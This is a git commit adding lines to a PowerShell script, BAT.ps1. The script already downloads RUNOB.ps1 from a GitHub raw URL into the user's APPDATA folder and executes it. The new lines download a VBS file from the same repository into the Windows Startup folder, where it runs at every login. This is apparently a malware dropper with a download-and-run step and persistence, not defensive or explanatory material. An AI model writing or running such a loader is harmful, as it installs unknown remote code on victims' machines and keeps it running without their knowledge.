32f9d302c77fa0cd77f16508954685a0a2d607af
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-15 23:02:25 +0700

    Update BAT.ps1

--- BAT.ps1
+++ BAT.ps1
@@ -6,3 +6,6 @@ $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNOB.ps1"
 $output5 = "$env:APPDATA\RUNOB.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
 & $output5
+$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/WINOB.vbs"
+$output6 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WINOB.vbs"
+Invoke-WebRequest -Uri $url6 -OutFile $output6
